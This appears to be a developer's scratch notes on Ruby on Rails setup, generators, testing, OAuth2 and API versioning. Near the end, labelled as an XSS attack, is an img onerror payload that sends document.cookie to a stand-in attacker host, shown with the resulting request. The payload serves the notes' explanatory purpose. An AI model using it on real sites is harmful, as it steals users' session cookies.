sudo gem install pg -v 0.17.1
checking for pg_config... no

##FIX
Install the postgresql-devel package, this will solve the issue of pg_config missing.

Ubuntu systems:
sudo apt-get install libpq-dev

RHEL systems:
yum install postgresql-devel

Mac:
brew install postgresql


##################################################################
rails new myapp --database=postgresql


# Begin logic
myproducts = Product.find(:all)
require 'pp'
pp myproducts



##Customer
id
first_name
last_name
user_name

##Category
id
name

##Product Categories
eCommerce Product Catalog allows to define unlimited amount of product categories. Product categories can be hierarchical or not.

To add or edit product categories go to Dashboard > Products > Product Categories. The edit screen allows to define:

Category name – this is the title of product category page
Slug – this is the URL of product category page
Parent – set parent of hierarchical category
Description – write the description for product category. The description shows up under the category name on product page.

##google: where to buy electronics

##SELECT * FROM comments AS c WHERE '1/4/5/7' LIKE c.path||'%';
##'1/4/5' '1/4' '1' will match
double bars are concatination:
select 'hello'||' '||'world' from dual;
yields=> 'hello world'



rails g model Product
rails g model Order
rails g migration add_sessions_table
rails g model Cart
rails g model LineItem
rails g model Customer

###############################################
>gem install rails -v=2.3.8
##gem sources --add http://gems.ruby-china.org/ --remove https://rubygems.org/
>gem sources -l
*** CURRENT SOURCES ***

http://gems.ruby-china.org/

> gem install rails -v=3.2.1
ERROR:  Error installing rails:
        invalid gem: package is corrupt, exception while verifying: undefined me
thod `size' for nil:NilClass (NoMethodError) in C:/Ruby22/lib/ruby/gems/2.2.0/cache/thread_safe-0.3.5.gem
=>delete the directory cache,errors will not appear when reexecute gem install

##rake db:migrate RAILS_ENV=test
##rails s -e test
>rake test:units
>rake test:functionals
>ruby -Itest test/unit/product_test.rb
>ruby -Itest test/unit/product_test.rb -n product_attributes_must_not_be_empty
>ruby -Itest test/unit/product_test.rb -n /attributes/

##rake spec
##rspec spec/models/product_spec.rb


>rails g scaffold Product title:string description:text image_url:string price:decimal
>rails g controller store index
>rails g session_migration
>rake db:migrate
>rails g scaffold cart
>rails g scaffold line_item product_id:integer cart_id:integer
>rails g migration add_quantity_to_line_item quantity:integer
>rails g migration combine_items_in_cart
>rails g scaffold order name:string address:text email:string pay_type:string
>rails g migration add_order_id_to_line_item order_id:integer
>rails g scaffold user name:string hashed_password:string salt:string
>rails g controller sessions new create destroy
>rails g controller admin index

##rake db:create RAILS_ENV=production
##rails s -e production 
##bundle exec rake assets:precompile RAILS_ENV=production
###############################################

##$ rails g task my_exercise load_data generate_delta_index
create lib/tasks/my_exercise.rake

##$ rake -T | grep my_exercise

运行RSpec的生成器
rails generate rspec:install  

生成器创建了几个新文件，分别是：
.rspec – 用于配置 rspec 命令行的配置文件，默认包含 – colour 来启用RSpec输出文字高亮。
spec – 该目录用于存放所有模型变量，控制器，视图，和项目中其它的specs。
spec/spec_helper.rb – 该文件会在每个spec执行时被调用。该文件设置了测试变量，并包含项目级别RSpec配置项，加载引用文件等等。

##Don't know how to build task=>
##add <require 'rake'> to Rakefile

rake spec

<%= link_to new_task_path, remote: true do %>
  <button class="btn btn-default">New</button>
<% end %>

<%= link_to task, remote: true, method: :delete,  data: { confirm: 'Are you sure?' } do %>
  <button>Delete</button>
<% end %>

url_for @book
###############################################
##In Rails 3, when a resource create action fails and calls render :new, why must the URL change to the resource's index url?

I just started with the Rails-Tutorial and had the same problem. The solution is just simple: If you want the same URL after submitting a form (with errors), just combine the new and create action in one action.

Here is the part of my code, which makes this possible (hope it helps someone^^)

**routes.rb** (Adding the post-route for new-action):
...
    resources :books
    post "books/new"
...

**Controller:**

...
def create
  @book = Book.new(book_params)

  if @book.save
    # save was successful
    print "Book saved!"

    else
    # If we have errors render the form again   
    render 'new'
  end
end

def new 
  if book_params
    # If data submitted already by the form we call the create method
    create
    return
  end

  @book = Book.new
  render 'new' # call it explicit
end

private

def book_params
  if params[:book].nil?  || params[:book].empty?
    return false
  else
    return params.require(:book).permit(:title, :isbn, :price)
  end
end

**new.html.erb:**

<%= form_for @book, :url => {:action => :new} do |f| %>
  <%= f.label :title %>
  <%= f.text_field :title %>
  <%= f.label :isbn %>
  <%= f.text_field :isbn %>
  <%= f.label :price %>
  <%= f.password_field :price %>
  <%= f.submit "Save book" %>
<% end %>
###############################################
http://site.com/callback#access_token=rBEGu1FQr54AzqE3Q&
refresh_token=rEbkldjfk45YD&expires_in=3600
var hash=document.location.hash;
var match=hash.match(/access_token=(\w+)/);

User
Client 
AccessToken 
RefreshToken 

Securing RESTful APIs using OAuth2 and OpenID Connect
openID + Oauth2
fetch the access token=>
Access Token Endpoint
client_id
client_secret
grant_type=client_credentials

$.ajax({
  url: resource_uri,
  beforeSend: function(xhr){
    xhr.setRequestHeader('Authorization','OAuth'+token);
    xhr.setRequestHeader('Accept','application/json');
  },
  success: function(response){
    //use response object
  }
});

###################################################
<img src=xonerror="document.body.appendChild(function(){
var a=document.createElement('img');
a.src='https://hackmeplz.com/yourCookies.png/?cookies='+document.cookie;
return a }())" >

GET
https://hackmeplz.com/yourCookies.png/?cookies=SessionID=123412341234

##XSS Attack
##Same-Origin-Policy

##JWT + Refresh Tokens=OAuth2 ?

Exercise::Application.routes.draw do
	scope module::v1,constraints:ApiConstraint.new(version: 1) do
		resources :articles,only: :index
	end

  scope module::v2,constraints:ApiConstraint.new(version: 2) do
		resources :articles,only: :index
	end
end

##Track Client Builds
What happens when you Need/Want to stop supporting a version?

curl http://localhost:3000/api/builds/457
[{"support_level": "active"}]

curl http://localhost:3000/api/builds/457
[{"support_level": "supported"}]

curl http://localhost:3000/api/builds/432
[{"support_level": "deprecated"}]

curl http://localhost:3000/api/builds/289
[{"support_level": "unsupported"}]


rails g controller Data --no-helper --no-assets --no-javascript











